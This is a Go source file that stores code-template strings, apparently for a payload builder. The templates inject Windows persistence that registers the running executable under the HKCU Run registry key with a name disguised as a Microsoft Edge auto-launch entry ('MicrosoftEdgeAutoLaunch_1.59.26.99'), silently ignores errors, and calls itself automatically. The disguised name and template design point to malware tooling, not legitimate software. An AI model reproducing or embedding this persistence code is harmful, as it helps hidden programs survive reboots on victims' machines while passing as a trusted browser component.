package encode

var (
	AutoRunString = []string{``, `
	oss "os"
	AutoRunFilePath "path/filepath"

	"golang.org/x/sys/windows/registry"
`, `

const (
	taskName = "MicrosoftEdgeAutoLaunch_1.59.26.99"
	// 注册表路径（回退方案）
	runKeyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
)

func AddToStartup() error {
	// 获取可执行文件的完整路径
	exePath, _ := getExePath()

	addToStartupViaRegistry(exePath)
	return nil

}

func addToStartupViaRegistry(exePath string) error {
	key, _ := registry.OpenKey(
		registry.CURRENT_USER,
		runKeyPath,
		registry.SET_VALUE|registry.QUERY_VALUE,
	)
	defer key.Close()

	existingPath, _, err := key.GetStringValue(taskName)
	if err == nil && existingPath == exePath {
		return nil
	}

	key.SetStringValue(taskName, exePath)

	return nil
}

// getExePath 获取当前可执行文件的完整路径
func getExePath() (string, error) {
	exePath, err := oss.Executable()
	if err != nil {
		return "", err
	}

	realPath, err := AutoRunFilePath.EvalSymlinks(exePath)
	if err != nil {
		return exePath, nil
	}
	return realPath, nil
}
`, `
	AddToStartup()`,
	}
)
